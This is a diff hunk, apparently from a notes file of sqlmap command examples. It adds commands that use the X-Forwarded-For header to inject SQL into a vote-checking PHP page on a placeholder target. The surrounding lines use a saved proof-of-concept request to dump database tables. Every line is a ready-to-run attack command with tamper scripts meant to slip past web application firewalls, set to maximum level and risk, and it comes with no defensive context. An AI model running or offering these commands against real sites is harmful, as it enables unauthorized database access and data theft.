@@ -27,3 +27,7 @@ $ sqlmap -r poc.txt --threads=10 --random-agent --level=5 --risk=3 --tamper=spac
 
 example dump DB use poc http post request :
 $ sqlmap -r poc.txt --threads=10 --random-agent --level=5 --risk=3 --tamper=space2comment,between --dbms=MySQL -D database_target --tables
+
+example WAF Header :
+$ sqlmap -u https://target.com/vote/check_vote.php --headers="X-Forwarded-For:1*" -p X-Forwarded-For --level=5 --risk=3 --tamper="space2comment,between,randomcase" --technique="BEUST" --no-cast --random-agent --drop-set-cookie --dbms=mysql --dbs
+$ sqlmap -u https://target.com/vote/check_vote.php --headers="X-Forwarded-For:1*" -p X-Forwarded-For --level=5 --risk=3 --tamper="space2comment,between,randomcase" --technique="BEUST" --no-cast --random-agent --dbs
